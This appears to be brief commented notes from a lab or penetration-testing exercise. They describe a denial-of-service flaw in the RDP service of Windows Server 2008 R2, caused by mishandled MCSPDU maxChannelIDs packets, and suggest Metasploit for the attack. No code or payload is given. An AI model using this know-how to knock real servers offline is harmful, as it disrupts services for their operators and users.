# for the prot 3389 rdp is enabled so we can run dos(denial of  service) attack to the target machine

# The flaw exists in the RDP service in mishandling the MCSPDU packet in the maxChannelIDs field, which
# leads to the usage of an invalid pointer, which created a condition for DOS attack. The hacker can send crafter
# RDP packets for RDP.

# we can use metasploit for the attack.

# The vulnerability allows remote attackers to engage in DOS attack
# to which the server 2008R2 is vulnerable through "Terminal Server Denial of Service Vulnerability crafted
# packets via RDP service.
